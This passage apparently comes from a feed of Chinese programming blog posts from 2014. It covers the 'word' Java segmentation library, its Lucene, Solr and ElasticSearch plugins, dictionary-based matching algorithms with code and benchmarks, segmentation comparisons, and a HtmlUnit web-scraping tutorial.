 　　SegmentationAlgorithm的可选类型为： 　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching  　　9、分词效果评估 　　运行项目根目录下的脚本evaluation.bat可以对分词效果进行评估 　　评估采用的测试文本有253 3709行，共2837 4490个字符 　　评估结果位于target/evaluation目录下： 　　corpus-text.txt为分好词的人工标注文本，词之间以空格分隔 　　test-text.txt为测试文本，是把corpus-text.txt以标点符号分隔为多行的结果 　　standard-text.txt为测试文本对应的人工标注文本，作为分词是否正确的标准 　　result-text-***.txt，***为各种分词算法名称，这是word分词结果　　 perfect-result-***.txt，***为各种分词算法名称，这是分词结果和人工标注标准完全一致的文本　　 wrong-result-***.txt，***为各种分词算法名称，这是分词结果
 
Lucene插件：
 
　　1、构造一个word分析器ChineseWordAnalyzer　　Analyzer analyzer = new ChineseWordAnalyzer();
 
　　2、利用word分析器切分文本　　TokenStream tokenStream = analyzer.tokenStream("text", "杨尚川是APDPlat应用级产品开发平台的作者");　　while(tokenStream.incrementToken()){　　CharTermAttribute charTermAttribute = tokenStream.getAttribute(CharTermAttribute.class);　　OffsetAttribute offsetAttribute = tokenStream.getAttribute(OffsetAttribute.class);　　System.out.println(charTermAttribute.toString()+" "+offsetAttribute.startOffset());　　}
 
 　　3、利用word分析器建立Lucene索引　　Directory directory = new RAMDirectory();　　IndexWriterConfig config = new IndexWriterConfig(Version.LUCENE_47, analyzer);　　IndexWriter indexWriter = new IndexWriter(directory, config);
 
 
　　4、利用word分析器查询Lucene索引　　QueryParser queryParser = new QueryParser(Version.LUCENE_47, "text", analyzer);　　Query query = queryParser.parse("text:杨尚川");　　TopDocs docs = indexSearcher.search(query, Integer.MAX_VALUE);
 
 
Solr插件：
 　　1、生成分词组件二进制jar　　执行 mvn clean install 生成word中文分词组件target/word-1.0.jar
 　　2、创建目录solr-4.7.1/example/solr/lib，将target/word-1.0.jar文件复制到lib目录
 　　3、配置schema指定分词器　　将solr-4.7.1/example/solr/collection1/conf/schema.xml文件中所有的　　<tokenizer class="solr.WhitespaceTokenizerFactory"/>和　　<tokenizer class="solr.StandardTokenizerFactory"/>全部替换为　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory"/>　　并移除所有的filter标签
　　4、如果需要使用特定的分词算法：　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory" segAlgorithm="ReverseMinimumMatching"/>　　segAlgorithm可选值有： 　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching　　如不指定，默认使用双向最大匹配算法：BidirectionalMaximumMatching
　　5、如果需要指定特定的配置文件：　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory" segAlgorithm="ReverseMinimumMatching"　　conf="C:/solr-4.7.0/example/solr/nutch/conf/word.local.conf"/>　　word.local.conf文件中可配置的内容见 word-1.0.jar 中的word.conf文件　　如不指定，使用默认配置文件，位于 word-1.0.jar 中的word.conf文件
 
 
ElasticSearch插件：
 　　1、执行命令： mvn clean install dependency:copy-dependencies
 　　2、创建目录elasticsearch-1.1.0/plugins/word
 　　3、将中文分词库文件target/word-1.0.jar和依赖的日志库文件 　　target/dependency/slf4j-api-1.6.4.jar　　target/dependency/logback-core-0.9.28.jar　　target/dependency/logback-classic-0.9.28.jar 　　复制到刚创建的word目录
 　　4、修改文件elasticsearch-1.1.0/config/elasticsearch.yml，新增如下配置： 　　index.analysis.analyzer.default.type : "word"　　index.analysis.tokenizer.default.type : "word"
 　　5、启动ElasticSearch测试效果，在Chrome浏览器中访问：　　http://localhost:9200/_analyze?analyzer=word&text=杨尚川是APDPlat应用级产品开发平台的作者
 　　6、自定义配置　　从word-1.0.jar中提取配置文件word.conf，改名为word.local.conf，放到elasticsearch-1.1.0/plugins/word目录下
 　　7、指定分词算法　　修改文件elasticsearch-1.1.0/config/elasticsearch.yml，新增如下配置：　　index.analysis.analyzer.default.segAlgorithm : "ReverseMinimumMatching"　　index.analysis.tokenizer.default.segAlgorithm : "ReverseMinimumMatching"
 　　这里segAlgorithm可指定的值有：　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching　　如不指定，默认使用双向最大匹配算法：BidirectionalMaximumMatching
 
词向量：
　　从大规模语料中统计一个词的上下文相关词，并用这些上下文相关词组成的向量来表达这个词。　　通过计算词向量的相似性，即可得到词的相似性。　　相似性的假设是建立在如果两个词的上下文相关词越相似，那么这两个词就越相似这个前提下的。
　　通过运行项目根目录下的脚本demo-word-vector-corpus.bat来体验word项目自带语料库的效果
 　　如果有自己的文本内容，可以使用脚本demo-word-vector-file.bat来对文本分词、建立词向量、计算相似性
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
word分词器、ansj分词器、mmseg4j分词器、ik-analyzer分词器分词效果评估, yangshangchuan.iteye.com.blog.2056537, Tue, 29 Apr 2014 09:33:26 +0800

word分词是一个Java实现的中文分词组件，提供了多种基于词典的分词算法，并利用ngram模型来消除歧义。 能准确识别英文、数字，以及日期、时间等数量词，能识别人名、地名、组织机构名等未登录词。 同时提供了Lucene、Solr、ElasticSearch插件。
 
word分词器分词效果评估主要评估下面7种分词算法：
 
正向最大匹配算法：MaximumMatching逆向最大匹配算法：ReverseMaximumMatching正向最小匹配算法：MinimumMatching逆向最小匹配算法：ReverseMinimumMatching双向最大匹配算法：BidirectionalMaximumMatching双向最小匹配算法：BidirectionalMinimumMatching双向最大最小匹配算法：BidirectionalMaximumMinimumMatching
 
所有的双向算法都使用ngram来消歧，分词效果评估分别评估bigram和trigram。
 
查看原文
 
    本文附件下载:
    
      evaluation.rar (6.5 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
中文分词效果对比, yangshangchuan.iteye.com.blog.2043184, Thu, 10 Apr 2014 18:18:55 +0800

使用40个句子，在word分词、搜狗分词和ansj分词之间看看区别有多大。
 
word分词效果：
 
杨尚川 是 apdplat 应用 级 产品 开发 平台 的 作者 
他 说 的 确实 在理 
提高 人民 生活 水平 
他俩 儿 谈恋爱 是从 头年 元月 开始 的 
王府 饭店 的 设施 和 服务 是 一流 的 
和服 务 于 三 日后 裁制 完毕 ， 并 呈送 将军 府 中 
研究 生命 的 起源 
他 明天 起身 去 北京 
在 这些 企业 中 国有 企业 有 十个 
他 站 起身 来 
他们 是 来 查 金泰 撞人 那件 事 的 
行 侠 仗义 的 查 金泰 远近 闻名 
长春 市长 春节 致辞 
他 从 马上 摔下 来 了 , 你 马上 下来 一 下 
乒乓球拍 卖完 了 
咬死 猎人 的 狗 
地面 积 了 厚厚 的 雪 
这 几块 地 面积 还 真 不小 
大学生活 象 白纸 
结 合成 分子式 
有 意见 分歧 
发展 中国 家兔 的 计划 
明天 他 将来 北京 
税收制度 将来 会 更 完善 
依靠 群众 才能 做好 工作 
现在 是 施展 才能 的 好 机会 
把手 举 起来 
茶杯 的 把手 断 了 
以 新的 姿态 出 现在 世界 东方 
使 节约粮食 进一步 形成 风气 
反映 了 一 个人 的 精神 面貌 
美国 加州 大学 的 科学 家 发现 
我 好不 挺好 
木 有 
下雨天 留客 天天 留 我 不留 
叔叔 亲 了 我 妈妈 也 亲 了 我 
白马非马 
学生会 写文章 
张掖 市民 陈军 
张掖市 明 乐 县  
 
搜狗分词效果 ：
 
杨尚川 是 apdplat 应用 级 产品 开发 平台 的 作者 
他 说 的确 实在 理 
提高 人民 生活 水平 
他 俩 儿 谈恋爱 是 从头 年 元月 开始 的 
王府 饭店 的 设施 和 服务 是 一流 的 
和 服务 于 三 日后 裁 制 完毕 并 呈送 将军府 中 
研究 生命 的 起源 
他 明天 起身 去 北京 
在 这些 企业 中国 有 企业 有 十 个 
他 站 起身 来 
他们 是 来 查 金泰 撞人 那 件 事 的 
行 侠 仗义 的 查 金泰 远近 闻名 
长春 市长 春节 致辞 
他 从 马上 摔下 来了 你 马上 下来 一下 
乒乓球 拍卖 完 了 
咬 死 猎人 的 狗 
地 面积 了 厚厚 的 雪 
这 几块 地 面积 还 真 不 小 
大学生 活象 白纸 
结合 成 分子式 
有 意见 分歧 
发展 中国 家兔 的 计划 
明天 他 将来 北京 
税收 制度 将来 会 更 完善 
依靠 群众 才能 做好 工作 
现在 是 施展 才能 的 好 机会 
把手 举起 来 
茶杯 的 把手 断了 
以 新 的 姿态 出现 在 世界 东方 
使 节约 粮食 进一步 形成 风气
反映 了 一个人 的 精神 面貌 
美国 加州 大学 的 科学家 发现 
我 好 不 挺 好 
木有 
下 雨天 留客 天天 留 我 不留 
叔叔 亲了 我 妈妈 也 亲了 我 
白马 非 马 
学生会 写文章 
张掖 市民 陈军 
张掖市 明 乐 县 
 
ansj分词效果：
 
杨尚川 是 apdplat 应用 级 产品开发 平台 的 作者 
他 说 的 确实 在理 
提高 人民 生活 水平 
他俩 儿 谈恋爱 是从 头年 元月 开始 的 
王府 饭店 的 设施 和 服务 是 一流 的 
和 服务 于 三日 后 裁制 完毕 ， 并 呈送 将军 府 中 
研究 生命 的 起源 
他 明天 起身 去 北京 
在 这些 企业 中 国有企业 有 十个 
他 站 起身 来 
他们 是 来 查 金泰 撞 人 那件事 的 
行侠仗义 的 查 金泰 远近闻名 
长春 市长 春节 致辞 
他 从 马上 摔下来 了 , 你 马上 下来 一下 
乒乓球拍 卖完 了 
咬 死 猎人 的 狗 
地面 积 了 厚厚的 雪 
这 几块 地 面积 还 真 不小 
大学 生活 象 白纸 
结合 成 分子式 
有 意见分歧 
发展中国家 兔 的 计划 
明天 他 将来 北京 
税收制度 将来 会 更 完善 
依靠群众 才能 做好 工作 
现在 是 施展才能 的 好 机会 
把手 举 起来 
茶杯 的 把手 断 了 
以 新 的 姿态 出现 在 世界 东方 
使 节约粮食 进一步 形成 风气 
反映 了 一个 人 的 精神面貌 
美国加州大学 的 科学家 发现 
我 好 不 挺 好 
木 有 
下雨天 留客 天天 留 我 不留 
叔叔 亲 了 我 妈妈 也 亲 了 我 
白马非马 
学生会 写文章 
张掖 市民 陈军 
张掖市 明 乐 县 
 
 
 看如下详细对比图（搜狗分词和word分词）：
  
 
看如下详细对比图（ansj分词和word分词）：
  
参考资料：
1、word分词
2、搜狗分词
3、ansj分词
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
中文分词算法 之 基于词典的逆向最小匹配算法, yangshangchuan.iteye.com.blog.2040431, Thu, 03 Apr 2014 12:34:20 +0800

在之前的博文中介绍了基于词典的逆向最大匹配算法，比如我们切分句子: 中华人民共和国万岁万岁万万岁，使用逆向最大匹配算法的切分结果为：[中华人民共和国, 万岁, 万岁, 万万岁]，可以看到，切分出来的词是很长的，粒度很粗，如果我们想要切分出很细粒度的词，该怎么办呢？
 
本文介绍逆向最小匹配算法，该算法和逆向最大匹配算法相得益彰，一个强调细粒度，一个强调粗粒度。
 
使用逆向最小匹配算法，必须注意的一点是：词典中不能有单字词，词的长度至少为2！我们看逆向最小匹配算法和逆向最大匹配算法的代码比较：
   
 
切分效果如下：
 
切分句子: 中华人民共和国万岁万岁万万岁
逆向最大匹配: [中华人民共和国, 万岁, 万岁, 万万岁]
逆向最小匹配: [中华, 人民, 共和国, 万岁, 万岁, 万, 万岁]
切分句子: 杨尚川是APDPlat应用级产品开发平台的作者
逆向最大匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品开发, 平台, 的, 作者]
逆向最小匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品, 开发, 平台, 的, 作者]
切分句子: 美国加州大学的科学家发现
逆向最大匹配: [美国加州大学, 的, 科学家, 发现]
逆向最小匹配: [美国, 加州, 大学, 的, 科, 学家, 发现]
 
代码托管于GITHUB
 
参考资料：
1、中文分词十年回顾
2、中文信息处理中的分词问题
3、汉语自动分词词典机制的实验研究
4、由字构词_中文分词新方法
5、汉语自动分词研究评述
 
NUTCH/HADOOP视频教程
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
中文分词算法 之 基于词典的正向最小匹配算法, yangshangchuan.iteye.com.blog.2040423, Thu, 03 Apr 2014 12:00:54 +0800

在之前的博文中介绍了基于词典的正向最大匹配算法，比如我们切分句子: 中华人民共和国万岁万岁万万岁，使用正向最大匹配算法的切分结果为：[中华人民共和国, 万岁, 万岁, 万万岁]，可以看到，切分出来的词是很长的，粒度很粗，如果我们想要切分出很细粒度的词，该怎么办呢？
 
本文介绍正向最小匹配算法，该算法和正向最大匹配算法相得益彰，一个强调细粒度，一个强调粗粒度。
 
使用正向最小匹配算法，必须注意的一点是：词典中不能有单字词，词的长度至少为2！我们看正向最小匹配算法和正向最大匹配算法的代码比较：
  
切分效果如下：
 
切分句子: 中华人民共和国万岁万岁万万岁
正向最大匹配: [中华人民共和国, 万岁, 万岁, 万万岁]
正向最小匹配: [中华, 人民, 共和, 国, 万岁, 万岁, 万万, 岁]
切分句子: 杨尚川是APDPlat应用级产品开发平台的作者
正向最大匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品开发, 平台, 的, 作者]
正向最小匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品, 开发, 平台, 的, 作者]
切分句子: 美国加州大学的科学家发现
正向最大匹配: [美国加州大学, 的, 科学家, 发现]
正向最小匹配: [美国, 加州, 大学, 的, 科学, 家, 发现]
  
 
 
代码托管于GITHUB
 
参考资料：
1、中文分词十年回顾
2、中文信息处理中的分词问题
3、汉语自动分词词典机制的实验研究
4、由字构词_中文分词新方法
5、汉语自动分词研究评述
 
NUTCH/HADOOP视频教程
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java中的null引用，超乎你想象, yangshangchuan.iteye.com.blog.2038163, Sat, 29 Mar 2014 01:37:04 +0800

In 2009 Tony Hoare, one of the giants of computer science, wrote:
 
I call it my billion-dollar mistake. It was the invention of the null reference in 1965. At that time, I was designing the first comprehensive type system for references in an object oriented language (ALGOL W). My goal was to ensure that all use of references should be absolutely safe, with checking performed automatically by the compiler. But I couldn't resist the temptation to put in a null reference, simply because it was so easy to implement. This has led to innumerable errors, vulnerabilities, and system crashes, which have probably caused a billion dollars of pain and damage in the last forty years. 
参考资料：
1、Java 8 in Action Lambdas, Streams and Functional-style Programming（1.6节第4段）
2、What is null in Java?
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
模拟浏览器的神器 - HtmlUnit, yangshangchuan.iteye.com.blog.2036809, Wed, 26 Mar 2014 10:55:43 +0800

随着Web的发展，RIA越来越多，JavaScript和Complex AJAX Libraries给网络爬虫带来了极大的挑战，解析页面的时候需要模拟浏览器执行JavaScript才能获得需要的文本内容。
 
好在有一个Java开源项目HtmlUnit，它能模拟Firefox、IE、Chrome等浏览器，不但可以用来测试Web应用，还可以用来解析包含JS的页面以提取信息。
 
下面看看HtmlUnit的效果如何：
 
首先，建立一个maven工程，引入junit依赖和HtmlUnit依赖：
 
<dependency>
	<groupId>junit</groupId>
	<artifactId>junit</artifactId>
	<version>4.8.2</version>
	<scope>test</scope>
</dependency>
<dependency>
	<groupId>net.sourceforge.htmlunit</groupId>
	<artifactId>htmlunit</artifactId>
	<version>2.14</version>
</dependency>
 
 
其次，写一个junit单元测试来使用HtmlUnit提取页面信息：
 
/**
 * 使用HtmlUnit模拟浏览器执行JS来获取网页内容
 * @author 杨尚川
 */
public class HtmlUnitTest {
    @Test
    public void homePage() throws Exception {
        final WebClient webClient = new WebClient(BrowserVersion.INTERNET_EXPLORER_11);
        final HtmlPage page = webClient.getPage("http://yangshangchuan.iteye.com");
        Assert.assertEquals("杨尚川的博客 - ITeye技术网站", page.getTitleText());
        final String pageAsXml = page.asXml();
        Assert.assertTrue(pageAsXml.contains("杨尚川，系统架构设计师，系统分析师，2013年度优秀开源项目APDPlat发起人，资深Nutch搜索引擎专家。多年专业的软件研发经验，从事过管理信息系统(MIS)开发、移动智能终端(Win CE、Android、Java ME)开发、搜索引擎(nutch、lucene、solr、elasticsearch)开发、大数据分析处理(Hadoop、Hbase、Pig、Hive)等工作。目前为独立咨询顾问，专注于大数据、搜索引擎等相关技术，为客户提供Nutch、Lucene、Hadoop、Solr、ElasticSearch、HBase、Pig、Hive、Gora等框架的解决方案、技术支持、技术咨询以及培训等服务。"));
        final String pageAsText = page.asText();
        Assert.assertTrue(pageAsText.contains("[置顶] 国内首套免费的《Nutch相关框架视频教程》(1-20)"));
        webClient.closeAllWindows();
    }
    @Test
    public void homePage_Firefox() throws Exception {
        final WebClient webClient = new WebClient(BrowserVersion.FIREFOX_24);
        final HtmlPage page = webClient.getPage("http://yangshangchuan.iteye.com");        
        Assert.assertEquals("杨尚川的博客 - ITeye技术网站", page.getTitleText());
        webClient.closeAllWindows();
    }
    @Test
    public void getElements() throws Exception {
        final WebClient webClient = new WebClient(BrowserVersion.CHROME);
        final HtmlPage page = webClient.getPage("http://yangshangchuan.iteye.com");
        final HtmlDivision div = page.getHtmlElementById("blog_actions");
        //获取子元素
        Iterator<DomElement> iter = div.getChildElements().iterator();
        while(iter.hasNext()){
            System.out.println(iter.next().getTextContent());
        }
        //获取所有输出链接
        for(HtmlAnchor anchor : page.getAnchors()){
            System.out.println(anchor.getTextContent()+" : "+anchor.getAttribute("href"));
        }
        webClient.closeAllWindows();
    }
    @Test
    public void xpath() throws Exception {
        final WebClient webClient = new WebClient();
        final HtmlPage page = webClient.getPage("http://yangshangchuan.iteye.com");
        //获取所有博文标题
        final List<HtmlAnchor> titles = (List<HtmlAnchor>)page.getByXPath("/html/body/div[2]/div[2]/div/div[16]/div/h3/a");
        for(HtmlAnchor title : titles){
            System.out.println(title.getTextContent()+" : "+title.getAttribute("href"));
        }
        //获取博主信息
        final HtmlDivision div = (HtmlDivision) page.getByXPath("//div[@id='blog_owner_name']").get(0);
        System.out.println(div.getTextContent());
        webClient.closeAllWindows();
    }
    @Test
    public void submittingForm() throws Exception {
        final WebClient webClient = new WebClient(BrowserVersion.FIREFOX_24);
        final HtmlPage page = webClient.getPage("http://www.oschina.net");
        // Form没有name和id属性
        final HtmlForm form = page.getForms().get(0);
        final HtmlTextInput textField = form.getInputByName("q");
        final HtmlButton button = form.getButtonByName("");
        textField.setValueAttribute("APDPlat");
        final HtmlPage resultPage = button.click();
        final String pageAsText = resultPage.asText();
        Assert.assertTrue(pageAsText.contains("找到约"));
        Assert.assertTrue(pageAsText.contains("条结果"));        
        webClient.closeAllWindows();
    }
}
 
 
最后，我们运行单元测试， 全部通过测试！ 
 
 
NUTCH/HADOOP视频教程
 
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
中文分词算法 之 词典机制性能优化与测试, yangshangchuan.iteye.com.blog.2035007, Sun, 23 Mar 2014 08:29:52 +0800

在之前的两篇博文中文分词算法 之 基于词典的正向最大匹配算法和中文分词算法 之 基于词典的逆向最大匹配算法中，我们对分词实现和词典实现都做了优化，本文对词典实现做进一步优化，并和之前的多个实现做一个对比，使用的词典下载地址，使用的测试文本下载地址。
 
优化TrieV3的关键在于把虚拟根节点（/）的子节点（词表首字母）提升为多个相互独立的根节点，并对这些根节点建立索引。优化的依据是根节点（词表首字母）的数量庞大，索引查找的速度远远超过二分查找。
 
下面看看进一步优化后的TrieV4和之前的TrieV3的对比：
    /**
     * 获取字符对应的根节点
     * 如果节点不存在
     * 则增加根节点后返回新增的节点
     * @param character 字符
     * @return 字符对应的根节点
     */
    private TrieNode getRootNodeIfNotExistThenCreate(char character){
        TrieNode trieNode = getRootNode(character);
        if(trieNode == null){
            trieNode = new TrieNode(character);
            addRootNode(trieNode);
        }
        return trieNode;
    }
    /**
     * 新增一个根节点
     * @param rootNode 根节点
     */
    private void addRootNode(TrieNode rootNode){
        //计算节点的存储索引
        int index = rootNode.getCharacter()%INDEX_LENGTH;
        //检查索引是否和其他节点冲突
        TrieNode existTrieNode = ROOT_NODES_INDEX[index];
        if(existTrieNode != null){
            //有冲突，将冲突节点附加到当前节点之后
            rootNode.setSibling(existTrieNode);
        }
        //新增的节点总是在最前
        ROOT_NODES_INDEX[index] = rootNode;
    }
    /**
     * 获取字符对应的根节点
     * 如果不存在，则返回NULL
     * @param character 字符
     * @return 字符对应的根节点
     */
    private TrieNode getRootNode(char character){
        //计算节点的存储索引
        int index = character%INDEX_LENGTH;
        TrieNode trieNode = ROOT_NODES_INDEX[index];
        while(trieNode != null && character != trieNode.getCharacter()){
            //如果节点和其他节点冲突，则需要链式查找
            trieNode = trieNode.getSibling();
        }
        return trieNode;
    }
 
 不同的字符可能会映射到同一个数组索引（映射冲突），所以需要给TrieNode增加一个引用sibling，当冲突发生的时候，可利用该引用将多个冲突元素链接起来，这样，在一个数组索引中就能存储多个TrieNode。如果冲突大量发生，不但会浪费已经分配的数组空间，而且会引起查找性能的下降，好在这里根节点的每个字符都不一样，冲突发生的情况非常少。我们看看词数目为427451的词典文件的冲突情况：
 
冲突次数为：1 的元素个数：2746
冲突次数为：2 的元素个数：1
冲突次数：2748
总槽数：12000
用槽数：9024
使用率：75.2%
剩槽数：2976
  
 
 
 
将词典文件和测试文本解压到当前目录下，使用下面的命令进行测试，需要注意的是，这里的-Xmx参数指定的值是相应的词典实现所需要的最小的堆空间，如果再小就无法完成分词：
 
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.TrieV4 -Xmx40m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.TrieV3 -Xmx40m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.TrieV2 -Xmx40m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.TrieV1 -Xmx120m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.Trie -Xmx200m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
nohup java -Ddic.class=org.apdplat.word.dictionary.impl.HashSet -Xmx50m  -cp target/word-1.0.jar org.apdplat.word.SegFile &
 
测试结果如下：
 
 
 
 
 
代码托管于GITHUB
 
参考资料：
1、中文分词十年回顾
2、中文信息处理中的分词问题
3、汉语自动分词词典机制的实验研究
4、由字构词_中文分词新方法
5、汉语自动分词研究评述
 
NUTCH/HADOOP视频教程
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
中文分词算法 之 基于词典的逆向最大匹配算法, yangshangchuan.iteye.com.blog.2033843, Thu, 20 Mar 2014 02:10:08 +0800

在之前的博文中介绍了基于词典的正向最大匹配算法，用了不到50行代码就实现了，然后分析了词典查找算法的时空复杂性，最后使用前缀树来实现词典查找算法，并做了3次优化。
 
下面我们看看基于词典的逆向最大匹配算法的实现，实验表明，对于汉语来说，逆向最大匹配算法比(正向)最大匹配算法更有效，如下代码所示：
 
    public static List<String> segReverse(String text){        
        Stack<String> result = new Stack<>();
        while(text.length()>0){
            int len=MAX_LENGTH;
            if(text.length()<len){
                len=text.length();
            }
            //取指定的最大长度的文本去词典里面匹配
            String tryWord = text.substring(text.length() - len);
            while(!DIC.contains(tryWord)){
                //如果长度为一且在词典中未找到匹配，则按长度为一切分
                if(tryWord.length()==1){
                    break;
                }
                //如果匹配不到，则长度减一继续匹配
                tryWord=tryWord.substring(1);
            }
            result.push(tryWord);
            //从待分词文本中去除已经分词的文本
            text=text.substring(0, text.length()-tryWord.length());
        }
        int len=result.size();
        List<String> list = new ArrayList<>(len);
        for(int i=0;i<len;i++){
            list.add(result.pop());
        }
        return list;
    }
 
算法跟正向相差不大，重点是使用Stack来存储分词结果，具体差异如下图所示：
 
下面看看正向和逆向的分词效果，使用如下代码：
 
public static void main(String[] args){
	List<String> sentences = new ArrayList<>();
	sentences.add("杨尚川是APDPlat应用级产品开发平台的作者");
	sentences.add("研究生命的起源");
	sentences.add("长春市长春节致辞");
	sentences.add("他从马上下来");
	sentences.add("乒乓球拍卖完了");
	sentences.add("咬死猎人的狗");
	sentences.add("大学生活象白纸");
	sentences.add("他有各种才能");
	sentences.add("有意见分歧");
	for(String sentence : sentences){
		System.out.println("正向最大匹配: "+seg(sentence));
		System.out.println("逆向最大匹配: "+segReverse(sentence));
	}
}
 
运行结果如下：
 
开始初始化词典
完成初始化词典，词数目：427452
最大分词长度：16
正向最大匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品开发, 平台, 的, 作者]
逆向最大匹配: [杨尚川, 是, APDPlat, 应用, 级, 产品开发, 平台, 的, 作者]
正向最大匹配: [研究生, 命, 的, 起源]
逆向最大匹配: [研究, 生命, 的, 起源]
正向最大匹配: [长春市, 长春, 节, 致辞]
逆向最大匹配: [长春, 市长, 春节, 致辞]
正向最大匹配: [他, 从, 马上, 下来]
逆向最大匹配: [他, 从, 马上, 下来]
正向最大匹配: [乒乓球拍, 卖完, 了]
逆向最大匹配: [乒乓球拍, 卖完, 了]
正向最大匹配: [咬, 死, 猎人, 的, 狗]
逆向最大匹配: [咬, 死, 猎人, 的, 狗]
正向最大匹配: [大学生, 活象, 白纸]
逆向最大匹配: [大学生, 活象, 白纸]
正向最大匹配: [他, 有, 各种, 才能]
逆向最大匹配: [他, 有, 各种, 才能]
正向最大匹配: [有意, 见, 分歧]
逆向最大匹配: [有, 意见分歧]
 
下面看看实际的分词性能如何，对输入文件进行分词，然后将分词结果保存到输出文件，输入文本文件从这里下载，解压后大小为69M，词典文件从这里下载，解压后大小为4.5M，项目源代码托管在GITHUB：
 
/**
 * 将一个文件分词后保存到另一个文件
 * @author 杨尚川
 */
public class SegFile {    
    public static void main(String[] args) throws Exception{
        String input = "input.txt";
        String output = "output.txt";
        if(args.length == 2){
            input = args[0];
            output = args[1];
        }
        long start = System.currentTimeMillis();
        segFile(input, output);
        long cost = System.currentTimeMillis()-start;
        System.out.println("cost time:"+cost+" ms");
    }
    public static void segFile(String input, String output) throws Exception{
        float max=(float)Runtime.getRuntime().maxMemory()/1000000;
        float total=(float)Runtime.getRuntime().totalMemory()/1000000;
        float free=(float)Runtime.getRuntime().freeMemory()/1000000;
        String pre="执行之前剩余内存:"+max+"-"+total+"+"+free+"="+(max-total+free);
        try(BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(input),"utf-8"));
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(output),"utf-8"))){
            int textLength=0;
            long start = System.currentTimeMillis();
            String line = reader.readLine();
            while(line != null){
                textLength += line.length();
                writer.write(WordSeg.seg(line).toString()+"\n");
                line = reader.readLine();
            }
            long cost = System.currentTimeMillis() - start;
            float rate = textLength/cost;
            System.out.println("文本字符："+textLength);
            System.out.println("分词耗时："+cost+" 毫秒");
            System.out.println("分词速度："+rate+" 字符/毫秒");
        }
        max=(float)Runtime.getRuntime().maxMemory()/1000000;
        total=(float)Runtime.getRuntime().totalMemory()/1000000;
        free=(float)Runtime.getRuntime().freeMemory()/1000000;
        String post="执行之后剩余内存:"+max+"-"+total+"+"+free+"="+(max-total+free);
        System.out.println(pre);
        System.out.println(post);
    }
}
 
测试结果如下（对比TrieV3和HashSet的表现）：
 
开始初始化词典
dic.class=org.apdplat.word.dictionary.impl.TrieV3
dic.path=dic.txt
完成初始化词典，耗时695 毫秒，词数目：427452
词典最大词长：16
词长  0 的词数为：1
词长  1 的词数为：11581
词长  2 的词数为：146497
词长  3 的词数为：162776
词长  4 的词数为：90855
词长  5 的词数为：6132
词长  6 的词数为：3744
词长  7 的词数为：2206
词长  8 的词数为：1321
词长  9 的词数为：797
词长 10 的词数为：632
词长 11 的词数为：312
词长 12 的词数为：282
词长 13 的词数为：124
词长 14 的词数为：116
词长 15 的词数为：51
词长 16 的词数为：25
词典平均词长：2.94809
字符数目：24960301
分词耗时：64014 毫秒
分词速度：389.0 字符/毫秒
执行之前剩余内存:2423.3901-61.14509+60.505272=2422.7505
执行之后剩余内存:2423.3901-961.08545+203.32925=1665.6339
cost time:64029 ms
 
开始初始化词典
dic.class=org.apdplat.word.dictionary.impl.HashSet
dic.path=dic.txt
完成初始化词典，耗时293 毫秒，词数目：427452
词典最大词长：16
词长  0 的词数为：1
词长  1 的词数为：11581
词长  2 的词数为：146497
词长  3 的词数为：162776
词长  4 的词数为：90855
词长  5 的词数为：6132
词长  6 的词数为：3744
词长  7 的词数为：2206
词长  8 的词数为：1321
词长  9 的词数为：797
词长 10 的词数为：632
词长 11 的词数为：312
词长 12 的词数为：282
词长 13 的词数为：124
词长 14 的词数为：116
词长 15 的词数为：51
词长 16 的词数为：25
词典平均词长：2.94809
字符数目：24960301
分词耗时：77254 毫秒
分词速度：323.0 字符/毫秒
